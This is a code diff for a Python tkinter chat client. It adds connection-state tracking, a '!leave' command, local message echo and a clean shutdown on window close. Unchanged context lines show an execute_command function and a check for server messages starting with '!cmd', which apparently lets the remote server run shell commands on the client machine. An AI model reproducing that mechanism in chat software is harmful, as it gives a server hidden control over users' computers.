@@ -11,6 +11,9 @@ ACCOUNT_FILE = "account.json"
 TEMP_DIR = "tools/tmp"
 ADDITION_SCRIPT = "tools/addition.py"
 LOGIN_SCRIPT = "tools/login.py"
+connection_started = False
+connected = False
+client = None
 
 def execute_command(command):
     try:
@@ -20,7 +23,8 @@ def execute_command(command):
         return f"Command failed: {e.output.decode('utf-8')}"
 
 def receive_messages(client, text_area):
-    while True:
+    global connected
+    while connected:
         try:
             message = client.recv(1024).decode('utf-8')
             if message.startswith("!cmd"):
@@ -35,43 +39,72 @@ def receive_messages(client, text_area):
         except Exception as e:
             messagebox.showerror("Error", f"Error: {e}")
             client.close()
+            connected = False
             break
 
-
 def start_client():
+    global connection_started, connected, client
+
     def on_connect_test():
         if connection_started or connected:
             messagebox.showinfo("Can't connect again", "Connected to the server. Type !leave to leave the server")
         else:
             on_connect()
-            
-        def on_connect():
-            global connection_started
-            connection_started = True
-                    
-            connection_code = entry_connection.get()
+
+    def on_connect():
+        global connection_started, connected, client
+        connection_started = True
+                        
+        connection_code = entry_connection.get()
+        try:
             server_ip, server_port = connection_code.split(":")
             server_port = int(server_port)
 
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((server_ip, server_port))
 
-            connection_started = False
-            global connected
             connected = True
+            connection_started = False
 
             receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
             receive_thread.start()
 
             def send_message():
                 message = entry_message.get()
-                if message:
+                if message and not message.startswith("!leave"):
+                    # Show message in the local text area (the sender's interface)
+                    text_area.config(state=tk.NORMAL)
+                    text_area.insert(tk.END, f"You: {message}\n")
+                    text_area.yview(tk.END)
+                    text_area.config(state=tk.DISABLED)
+
+                    # Send the message to the server
                     client.send(message.encode('utf-8'))
                     entry_message.delete(0, tk.END)  # Clear input after sending
-        
-            client.send(client_username.encode('utf-8'))
 
+                elif message == "!leave":
+                    client.send(message.encode('utf-8'))
+                    connected = False
+                    client.close()
+                    entry_message.delete(0, tk.END)  # Clear input after sending
+                    messagebox.showinfo("Disconnected", "You have left the server.")
+            
+            client.send(client_username.encode('utf-8'))
             button_send.config(command=send_message)
+
+        except Exception as e:
+            connection_started = False
+            connected = False
+            messagebox.showerror("Connection Error", f"Failed to connect: {e}")
+
+    # Function to handle closing the window
+    def on_closing():
+        global connected, client
+        if connected:
+            connected = False
+            client.close()  # Close the socket connection
+        root.destroy()  # Destroy the GUI window
+        sys.exit()  # Exit the script
 
     # Check if account file exists before running the client
     account_file = os.path.join(TEMP_DIR, ACCOUNT_FILE)
@@ -120,6 +153,9 @@ def start_client():
 
     button_send = tk.Button(frame, text="Send")
     button_send.pack(side=tk.LEFT)
+
+    # Bind the closing event to the on_closing function
+    root.protocol("WM_DELETE_WINDOW", on_closing)
 
     root.mainloop()
 
